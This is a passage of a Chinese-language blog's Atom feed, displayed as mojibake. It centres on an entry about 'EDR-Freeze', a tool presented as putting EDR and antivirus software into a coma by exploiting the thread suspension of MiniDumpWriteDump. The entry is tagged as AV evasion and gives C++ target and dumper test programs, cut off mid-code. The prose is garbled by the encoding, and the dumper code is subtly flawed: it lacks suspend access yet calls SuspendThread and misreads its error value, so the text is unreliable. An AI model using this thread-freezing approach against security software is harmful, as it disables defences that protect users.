¸ä¸ºæ¯ä¸ªè¿›ç¨‹ç»´æŠ¤çš„ä¸€ä¸ªé«˜æ•ˆâ€œå†…å­˜åœ°å›¾â€ï¼Œå®ƒç²¾ç¡®æè¿°äº†è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´çš„ä½¿ç”¨æƒ…å†µã€‚</strong> å®ƒä¸ä»…æ˜¯æ“ä½œç³»ç»Ÿæ­£å¸¸è¿ä½œçš„åŸºçŸ³ï¼Œä¹Ÿæ˜¯å®‰å…¨ç ”ç©¶äººå‘˜å’Œæ•°å­—å–è¯åˆ†æå¸ˆæ·±å…¥æ¢ç©¶è¿›ç¨‹å†…éƒ¨çŠ¶æ€ã€æ£€æµ‹é«˜çº§å¨èƒçš„ä¸å¯æˆ–ç¼ºçš„å¼ºå¤§å·¥å…·ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VADæ ‘&quot;&gt;&lt;a href=&quot;#VADæ ‘&quot; class=&quot;headerlink&quot; title=&quot;VADæ ‘&quot;&gt;&lt;/a&gt;VADæ ‘&lt;/h1&gt;&lt;h2 id=&quot;1-ä»€ä¹ˆæ˜¯-VAD-æ ‘ï¼Ÿ&quot;&gt;&lt;a href=&quot;#1-ä»€ä¹ˆæ˜¯-VAD-æ ‘ï¼Ÿ&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
    <category term="å…æ€" scheme="https://250wuyifan.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>EDR-Freezeï¼šä¸€æ¬¾è®© EDR å’Œæ€æ¯’è½¯ä»¶è¿›å…¥æ˜è¿·çŠ¶æ€çš„å·¥å…·</title>
    <link href="https://250wuyifan.github.io/2025/09/22/EDR-Freeze%EF%BC%9A%E4%B8%80%E6%AC%BE%E8%AE%A9-EDR-%E5%92%8C%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E8%BF%9B%E5%85%A5%E6%98%8F%E8%BF%B7%E7%8A%B6%E6%80%81%E7%9A%84%E5%B7%A5%E5%85%B7/"/>
    <id>https://250wuyifan.github.io/2025/09/22/EDR-Freeze%EF%BC%9A%E4%B8%80%E6%AC%BE%E8%AE%A9-EDR-%E5%92%8C%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E8%BF%9B%E5%85%A5%E6%98%8F%E8%BF%B7%E7%8A%B6%E6%80%81%E7%9A%84%E5%B7%A5%E5%85%B7/</id>
    <published>2025-09-22T14:37:47.000Z</published>
    <updated>2025-09-22T18:20:43.241Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¸»è¦éƒ¨åˆ†"><a href="#ä¸»è¦éƒ¨åˆ†" class="headerlink" title="ä¸»è¦éƒ¨åˆ†"></a>ä¸»è¦éƒ¨åˆ†</h1><h2 id="Minidumpwritedump-å‡½æ•°"><a href="#Minidumpwritedump-å‡½æ•°" class="headerlink" title="Minidumpwritedump å‡½æ•°"></a><code>Minidumpwritedump</code> å‡½æ•°</h2><h3 id="å…³äº-MiniDumpWriteDump-å‡½æ•°çš„åŸºæœ¬ä¿¡æ¯"><a href="#å…³äº-MiniDumpWriteDump-å‡½æ•°çš„åŸºæœ¬ä¿¡æ¯" class="headerlink" title="å…³äº MiniDumpWriteDump å‡½æ•°çš„åŸºæœ¬ä¿¡æ¯"></a>å…³äº <code>MiniDumpWriteDump</code> å‡½æ•°çš„åŸºæœ¬ä¿¡æ¯</h3><p><code>MiniDumpWriteDump</code>æ˜¯ Windows ç³»ç»Ÿä¸­ <code>DbgHelp.dll</code>åº“æä¾›çš„ä¸€ä¸ªéå¸¸é‡è¦çš„å‡½æ•°ã€‚å®ƒçš„æ ¸å¿ƒä½œç”¨æ˜¯<strong>ä¸ºæŒ‡å®šçš„è¿›ç¨‹åˆ›å»ºä¸€ä¸ªâ€œè¿·ä½ è½¬å‚¨æ–‡ä»¶â€ï¼ˆMinidumpï¼‰</strong>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„ <strong>dump æ–‡ä»¶</strong>ã€‚è¿™ä¸ªæ–‡ä»¶ç›¸å½“äºè¿›ç¨‹åœ¨æŸä¸ªæ—¶é—´ç‚¹çš„â€œå¿«ç…§â€ï¼ŒåŒ…å«äº†è°ƒè¯•è¯¥è¿›ç¨‹é—®é¢˜ï¼ˆå¦‚å´©æºƒã€æŒ‚èµ·ï¼‰æ‰€éœ€çš„å…³é”®ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š</p><ul><li>çº¿ç¨‹ä¿¡æ¯ï¼ˆè°ƒç”¨æ ˆã€å¯„å­˜å™¨çŠ¶æ€ï¼‰</li><li>æ¨¡å—ä¿¡æ¯ï¼ˆåŠ è½½çš„ DLLï¼‰</li><li>å¼‚å¸¸ä¿¡æ¯ï¼ˆå¦‚æœæ˜¯å› ä¸ºæœªå¤„ç†å¼‚å¸¸è€Œå´©æºƒï¼‰</li><li>å¯é€‰çš„å†…å­˜å†…å®¹ï¼ˆæ ¹æ®å‚æ•°å†³å®šåŒ…å«å¤šå°‘å†…å­˜ï¼‰</li></ul><hr><h3 id="å…³é”®è¡Œä¸ºï¼šæŒ‚èµ·æ‰€æœ‰çº¿ç¨‹"><a href="#å…³é”®è¡Œä¸ºï¼šæŒ‚èµ·æ‰€æœ‰çº¿ç¨‹" class="headerlink" title="å…³é”®è¡Œä¸ºï¼šæŒ‚èµ·æ‰€æœ‰çº¿ç¨‹"></a>å…³é”®è¡Œä¸ºï¼šæŒ‚èµ·æ‰€æœ‰çº¿ç¨‹</h3><p>æ‚¨æåˆ°çš„â€œå®ƒä¼šæŒ‚èµ·ç›®æ ‡è¿›ç¨‹ä¸­çš„æ‰€æœ‰çº¿ç¨‹â€æ˜¯<strong>å®Œå…¨æ­£ç¡®</strong>çš„ï¼Œè¿™ä¹Ÿæ˜¯è¿™ä¸ªå‡½æ•°æœ€å…³é”®çš„è¡Œä¸ºä¹‹ä¸€ã€‚</p><ul><li><strong>ä¸ºä»€ä¹ˆå¿…é¡»è¿™ä¹ˆåšï¼Ÿ<strong>ä¸ºäº†ä¿è¯ç”Ÿæˆçš„ dump æ–‡ä»¶æ˜¯</strong>å†…éƒ¨ä¸€è‡´ä¸”æœ‰æ•ˆ</strong>çš„ã€‚æƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœä¸æŒ‚èµ·çº¿ç¨‹ï¼Œè¿›ç¨‹ä¸­çš„çº¿ç¨‹ä»åœ¨å¹¶å‘æ‰§è¡Œï¼Œå®ƒä»¬ä¼šä¸æ–­åœ°ä¿®æ”¹å†…å­˜ï¼ˆå¦‚å †æ ˆã€å…¨å±€å˜é‡ï¼‰ã€åˆ†é…&#x2F;é‡Šæ”¾èµ„æºã€‚åœ¨è¿™ç§æƒ…å†µä¸‹æŠ“å–å¿«ç…§ï¼Œå¾—åˆ°çš„ dump æ–‡ä»¶å¯èƒ½ï¼š<strong>æ•°æ®ä¸ä¸€è‡´</strong>ï¼šä¾‹å¦‚ï¼Œä¸€ä¸ªçº¿ç¨‹çš„è°ƒç”¨æ ˆå¯èƒ½æ­£åœ¨å˜åŒ–ï¼Œå¯¼è‡´æ ˆå›æº¯ä¿¡æ¯é”™è¯¯ã€‚<strong>å†…å­˜çŠ¶æ€ç ´ç¢</strong>ï¼šä¾‹å¦‚ï¼ŒæŠ“å–åˆ°çš„å †å†…å­˜å—å¯èƒ½å¤„äºæ­£åœ¨åˆ†é…æˆ–é‡Šæ”¾çš„ä¸­é—´çŠ¶æ€ï¼Œåˆ†æèµ·æ¥æ¯«æ— æ„ä¹‰ã€‚é€šè¿‡æŒ‚èµ·æ‰€æœ‰çº¿ç¨‹ï¼Œå‡½æ•°ç¡®ä¿äº†åœ¨ç”Ÿæˆè½¬å‚¨æ–‡ä»¶çš„æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œè¿›ç¨‹çš„å†…å­˜å’ŒçŠ¶æ€æ˜¯<strong>å®Œå…¨å†»ç»“</strong>çš„ï¼Œä»è€Œå¾—åˆ°ä¸€ä¸ªå…·æœ‰ä¸€è‡´æ€§çš„ã€å¯ç”¨äºåˆ†æçš„å¿«ç…§ã€‚</li><li><strong>ä½•æ—¶æ¢å¤ï¼Ÿ<strong>è¯¥å‡½æ•°åœ¨å®Œæˆæ•°æ®æ”¶é›†åï¼Œä¼š</strong>è‡ªåŠ¨æ¢å¤</strong>æ‰€æœ‰è¢«æŒ‚èµ·çš„çº¿ç¨‹ã€‚è¿™ä¸ªè¿‡ç¨‹å¯¹è°ƒç”¨è€…æ˜¯é€æ˜çš„ã€‚</li></ul><hr><h3 id="é‡è¦å»ºè®®ï¼šä»å¤–éƒ¨è¿›ç¨‹è°ƒç”¨"><a href="#é‡è¦å»ºè®®ï¼šä»å¤–éƒ¨è¿›ç¨‹è°ƒç”¨" class="headerlink" title="é‡è¦å»ºè®®ï¼šä»å¤–éƒ¨è¿›ç¨‹è°ƒç”¨"></a>é‡è¦å»ºè®®ï¼šä»å¤–éƒ¨è¿›ç¨‹è°ƒç”¨</h3><p>å¾®è½¯å®˜æ–¹å¼ºçƒˆå»ºè®®<strong>ä¸è¦</strong>åœ¨ç›®æ ‡è¿›ç¨‹å†…éƒ¨è°ƒç”¨ <code>MiniDumpWriteDump</code>ï¼ˆä¾‹å¦‚ï¼Œåœ¨è¿›ç¨‹è‡ªå·±çš„æœªå¤„ç†å¼‚å¸¸è¿‡æ»¤å™¨ä¸­ç›´æ¥è°ƒç”¨ï¼‰ï¼Œè€Œåº”è¯¥ä»ä¸€ä¸ª<strong>ç‹¬ç«‹çš„ã€å¤–éƒ¨çš„è¾…åŠ©è¿›ç¨‹</strong>æ¥è°ƒç”¨å®ƒã€‚</p><ul><li><strong>ä¸ºä»€ä¹ˆï¼Ÿ<strong>ä¸»è¦åŸå› æ­£æ˜¯ä¸ºäº†é¿å…</strong>æ­»é”ï¼ˆDeadlockï¼‰</strong>ã€‚<strong>å†…éƒ¨è°ƒç”¨çš„é£é™©</strong>ï¼šå‡è®¾è¿›ç¨‹ A å‘ç”Ÿäº†å´©æºƒã€‚<strong>çº¿ç¨‹å·²åœæ­¢</strong>ï¼šå´©æºƒæ—¶ï¼Œå‘ç”Ÿå¼‚å¸¸çš„çº¿ç¨‹ä¼šæš‚åœï¼Œç­‰å¾…è°ƒè¯•å™¨å¤„ç†ã€‚è¿›ç¨‹ä¸­çš„å…¶ä»–çº¿ç¨‹å¯èƒ½ä»åœ¨è¿è¡Œï¼Œä¹Ÿå¯èƒ½å› ä¸ºå„ç§åŒæ­¥æœºåˆ¶ï¼ˆå¦‚é”ï¼‰è€Œå¤„äºä¸ç¡®å®šçŠ¶æ€ã€‚<strong>æ­»é”åœºæ™¯</strong>ï¼šå¦‚æœæ­¤æ—¶åœ¨è¿›ç¨‹ A å†…éƒ¨è°ƒç”¨ <code>MiniDumpWriteDump</code>ï¼Œè¯¥å‡½æ•°ä¼šå°è¯•æŒ‚èµ·è¿›ç¨‹ A ä¸­<strong>æ‰€æœ‰å…¶ä»–çº¿ç¨‹</strong>ã€‚å¦‚æœæŸä¸ªçº¿ç¨‹æ­£å¥½æŒæœ‰ä¸€ä¸ª<strong>é”</strong>ï¼ˆä¾‹å¦‚ï¼Œå †é”ã€CRT é”ã€ç”šè‡³æ˜¯åŠ è½½å™¨é”ï¼‰ï¼Œè€ŒæŒ‚èµ·å®ƒæ—¶ï¼Œå®ƒæ­£æŒæœ‰è¿™ä¸ªé”ã€‚<code>MiniDumpWriteDump</code>å‡½æ•°åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œ<strong>è‡ªèº«å¯èƒ½éœ€è¦è·å–é‚£ä¸ªç›¸åŒçš„é”</strong>æ¥è·å–ä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼Œéå†æ¨¡å—åˆ—è¡¨éœ€è¦åŠ è½½å™¨é”ï¼‰ã€‚ç»“æœå°±æ˜¯ï¼š<code>MiniDumpWriteDump</code>åœ¨ç­‰å¾…é‚£ä¸ªé”è¢«é‡Šæ”¾ï¼Œä½†æŒæœ‰é”çš„çº¿ç¨‹å·²ç»è¢«å®ƒæŒ‚èµ·äº†ï¼Œæ°¸è¿œæ— æ³•é‡Šæ”¾é”ã€‚è¿™å°±å¯¼è‡´äº†<strong>æ­»é”</strong>ï¼Œè¿›ç¨‹ä¼šæ°¸è¿œå¡ä½ï¼Œæ— æ³•ç”Ÿæˆè½¬å‚¨æ–‡ä»¶ã€‚</li><li><strong>æœ€ä½³å®è·µï¼šå¤–éƒ¨è¿›ç¨‹è½¬å‚¨</strong>åˆ›å»ºä¸€ä¸ªä¸“é—¨çš„â€œè½¬å‚¨è¾…åŠ©ç¨‹åºâ€ï¼ˆDumper Helperï¼‰ã€‚å½“è¿›ç¨‹ A å´©æºƒæ—¶ï¼Œå®ƒé€šçŸ¥ï¼ˆæˆ–å¯åŠ¨ï¼‰è¿™ä¸ªè¾…åŠ©ç¨‹åºã€‚è¾…åŠ©ç¨‹åºè°ƒç”¨ <code>DebugActiveProcess</code>å‡½æ•°é™„åŠ åˆ°è¿›ç¨‹ A ä¸Šï¼Œä½¿å…¶æˆä¸ºä¸€ä¸ªè°ƒè¯•å™¨ã€‚ç„¶åï¼Œè¾…åŠ©ç¨‹åºå†è°ƒç”¨ <code>MiniDumpWriteDump</code>ï¼Œå¹¶å°†è¿›ç¨‹ A çš„å¥æŸ„å’Œ id ä¼ ç»™å®ƒã€‚å› ä¸ºè°ƒç”¨æ–¹æ˜¯ç‹¬ç«‹çš„å¤–éƒ¨è¿›ç¨‹ï¼Œå®ƒä¸å­˜åœ¨ä¸ç›®æ ‡è¿›ç¨‹å…±äº«é”çš„é—®é¢˜ï¼Œä»è€Œå®Œç¾é¿å…äº†æ­»é”çš„é£é™©ã€‚è¿™æ˜¯ç”Ÿæˆè½¬å‚¨æ–‡ä»¶æœ€å¯é ã€æœ€æ¨èçš„æ–¹å¼ã€‚</li></ul><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><table><thead><tr><th>ç‰¹æ€§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>åŠŸèƒ½</strong></td><td>ç”Ÿæˆè¿›ç¨‹çš„å†…å­˜è½¬å‚¨æ–‡ä»¶ï¼ˆMinidumpï¼‰ï¼Œç”¨äºè°ƒè¯•åˆ†æã€‚</td></tr><tr><td><strong>å…³é”®è¡Œä¸º</strong></td><td><strong>æŒ‚èµ·ç›®æ ‡è¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹</strong>ï¼Œä»¥ç¡®ä¿è·å–åˆ°çš„æ•°æ®å¿«ç…§å…·æœ‰ä¸€è‡´æ€§ã€‚</td></tr><tr><td><strong>ä¸»è¦é£é™©</strong></td><td>åœ¨<strong>ç›®æ ‡è¿›ç¨‹å†…éƒ¨</strong>è°ƒç”¨å®¹æ˜“å¯¼è‡´<strong>æ­»é”</strong>ï¼Œä½¿è½¬å‚¨å¤±è´¥ã€‚</td></tr><tr><td><strong>æœ€ä½³å®è·µ</strong></td><td>å§‹ç»ˆä»ä¸€ä¸ª<strong>ç‹¬ç«‹çš„ã€å¤–éƒ¨çš„è¾…åŠ©è¿›ç¨‹</strong>æ¥è°ƒç”¨æ­¤å‡½æ•°ï¼Œä»¥é¿å…æ­»é”å¹¶ç¡®ä¿å¯é æ€§ã€‚</td></tr></tbody></table><h2 id="éªŒè¯-MiniDumpWriteDumpæ˜¯å¦ä¼šæš‚åœç›®æ ‡è¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹"><a href="#éªŒè¯-MiniDumpWriteDumpæ˜¯å¦ä¼šæš‚åœç›®æ ‡è¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹" class="headerlink" title="éªŒè¯ MiniDumpWriteDumpæ˜¯å¦ä¼šæš‚åœç›®æ ‡è¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹"></a>éªŒè¯ <code>MiniDumpWriteDump</code>æ˜¯å¦ä¼šæš‚åœç›®æ ‡è¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¼–å†™ä¸€ä¸ªç®€å•çš„æµ‹è¯•ç¨‹åºæ¥éªŒè¯ <code>MiniDumpWriteDump</code>æ˜¯å¦ä¼šæš‚åœç›®æ ‡è¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹ã€‚ä»¥ä¸‹æ˜¯å®ç°æ€è·¯ï¼š</p><ol><li><strong>ç›®æ ‡è¿›ç¨‹ï¼ˆTarget.exeï¼‰</strong>ï¼šåˆ›å»ºä¸€ä¸ªå¤šçº¿ç¨‹ç¨‹åºï¼Œæ¯ä¸ªçº¿ç¨‹æŒç»­è¿è¡Œï¼ˆä¾‹å¦‚ï¼Œæ‰“å°æ—¥å¿—æˆ–è®¡ç®—ï¼‰ã€‚åœ¨è¿è¡Œæ—¶ï¼Œæˆ‘ä»¬è§‚å¯Ÿçº¿ç¨‹æ˜¯å¦è¢«æš‚åœã€‚</li><li><strong>è½¬å‚¨è¿›ç¨‹ï¼ˆDumper.exeï¼‰</strong>ï¼šä½¿ç”¨ <code>MiniDumpWriteDump</code>å¯¹ç›®æ ‡è¿›ç¨‹è¿›è¡Œè½¬å‚¨ã€‚åœ¨è½¬å‚¨æœŸé—´ï¼Œæ£€æŸ¥ç›®æ ‡è¿›ç¨‹çš„çº¿ç¨‹çŠ¶æ€ã€‚</li></ol><hr><h3 id="ç›®æ ‡è¿›ç¨‹ï¼ˆTarget-exeï¼‰"><a href="#ç›®æ ‡è¿›ç¨‹ï¼ˆTarget-exeï¼‰" class="headerlink" title="ç›®æ ‡è¿›ç¨‹ï¼ˆTarget.exeï¼‰"></a><strong>ç›®æ ‡è¿›ç¨‹ï¼ˆTarget.exeï¼‰</strong></h3><p>è¿™ä¸ªç¨‹åºä¼šåˆ›å»ºå¤šä¸ªçº¿ç¨‹ï¼Œæ¯ä¸ªçº¿ç¨‹æŒç»­è¿è¡Œï¼Œå¹¶æ‰“å°æ—¥å¿—ã€‚</p><h3 id="C-ä»£ç ï¼ˆTarget-cppï¼‰"><a href="#C-ä»£ç ï¼ˆTarget-cppï¼‰" class="headerlink" title="C++ ä»£ç ï¼ˆTarget.cppï¼‰"></a><strong>C++ ä»£ç ï¼ˆTarget.cppï¼‰</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// çº¿ç¨‹å‡½æ•°ï¼šæŒç»­è¿è¡Œå¹¶æ‰“å°æ—¥å¿—</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">WorkerThread</span><span class="params">(<span class="type">int</span> threadId)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Thread &quot;</span> &lt;&lt; threadId &lt;&lt; <span class="string">&quot; is running...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::this_thread::sleep_for(<span class="built_in">std</span>::chrono::seconds(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Target Process Started (PID: &quot;</span> &lt;&lt; GetCurrentProcessId() &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»º 3 ä¸ªå·¥ä½œçº¿ç¨‹</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::thread&gt; threads;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        threads.emplace_back(WorkerThread, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸»çº¿ç¨‹ä¹Ÿæ‰“å°æ—¥å¿—</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Main thread is running...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::this_thread::sleep_for(<span class="built_in">std</span>::chrono::seconds(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¼–è¯‘ &amp; è¿è¡Œï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ Target.cpp -o Target.exe -static-libgcc -static-libstdc++</span><br><span class="line">./Target.exe</span><br></pre></td></tr></table></figure><p>å®ƒä¼šè¾“å‡ºç±»ä¼¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Target Process Started (PID: 1234)</span><br><span class="line">Thread 0 is running...</span><br><span class="line">Thread 1 is running...</span><br><span class="line">Thread 2 is running...</span><br><span class="line">Main thread is running...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><hr><h3 id="è½¬å‚¨è¿›ç¨‹ï¼ˆDumper-exeï¼‰"><a href="#è½¬å‚¨è¿›ç¨‹ï¼ˆDumper-exeï¼‰" class="headerlink" title="è½¬å‚¨è¿›ç¨‹ï¼ˆDumper.exeï¼‰"></a><strong>è½¬å‚¨è¿›ç¨‹ï¼ˆDumper.exeï¼‰</strong></h3><p>è¿™ä¸ªç¨‹åºä¼šé™„åŠ åˆ°ç›®æ ‡è¿›ç¨‹å¹¶è°ƒç”¨ <code>MiniDumpWriteDump</code>ï¼ŒåŒæ—¶æ£€æŸ¥ç›®æ ‡è¿›ç¨‹çš„çº¿ç¨‹çŠ¶æ€ã€‚</p><h3 id="C-ä»£ç ï¼ˆDumper-cppï¼‰"><a href="#C-ä»£ç ï¼ˆDumper-cppï¼‰" class="headerlink" title="C++ ä»£ç ï¼ˆDumper.cppï¼‰"></a><strong>C++ ä»£ç ï¼ˆDumper.cppï¼‰</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dbghelp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;dbghelp.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ£€æŸ¥ç›®æ ‡è¿›ç¨‹çš„çº¿ç¨‹çŠ¶æ€</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CheckThreads</span><span class="params">(DWORD pid)</span> &#123;</span><br><span class="line">    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hThreadSnap == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to create thread snapshot!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    THREADENTRY32 te32;</span><br><span class="line">    te32.dwSize = <span class="keyword">sizeof</span>(THREADENTRY32);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!Thread32First(hThreadSnap, &amp;te32)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Thread32First failed!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        CloseHandle(hThreadSnap);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (te32.th32OwnerProcessID == pid) &#123;</span><br><span class="line">            HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, te32.th32ThreadID);</span><br><span class="line">            <span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">                DWORD suspendCount = SuspendThread(hThread); <span class="comment">// å°è¯•æŒ‚èµ·çº¿ç¨‹</span></span><br><span class="line">                <span class="keyword">if</span> (suspendCount == (DWORD)<span class="number">-1</span>) &#123;</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Thread &quot;</span> &lt;&lt; te32.th32ThreadID &lt;&lt; <span class="string">&quot; is already suspended!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Thread &quot;</span> &lt;&lt; te32.th32ThreadID &lt;&lt; <span class="string">&quot; was running (suspend count: &quot;</span> &lt;&lt; suspendCount &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                    